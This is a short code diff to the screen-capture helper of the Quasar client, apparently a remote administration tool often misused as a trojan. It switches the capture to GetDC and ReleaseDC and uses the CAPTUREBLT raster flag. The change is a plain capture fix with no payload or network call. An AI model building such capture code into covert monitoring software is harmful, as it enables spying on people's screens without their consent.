@@ -9,6 +9,7 @@ namespace Quasar.Client.Helper
     public static class ScreenHelper
     {
         private const int SRCCOPY = 0x00CC0020;
+        private const int CAPTUREBLT = 0x40000000;
 
         public static Bitmap CaptureScreen(int screenNumber)
         {
@@ -18,12 +19,13 @@ namespace Quasar.Client.Helper
             using (Graphics g = Graphics.FromImage(screen))
             {
                 IntPtr destDeviceContext = g.GetHdc();
-                IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
-
+                //IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
+                IntPtr srcDeviceContext = NativeMethods.GetDC((IntPtr)0);
                 NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
-                    bounds.Y, SRCCOPY);
+                    bounds.Y, 1087111200);
 
-                NativeMethods.DeleteDC(srcDeviceContext);
+                //NativeMethods.DeleteDC(srcDeviceContext);
+                NativeMethods.ReleaseDC((IntPtr)0, srcDeviceContext);
                 g.ReleaseHdc(destDeviceContext);
             }
 
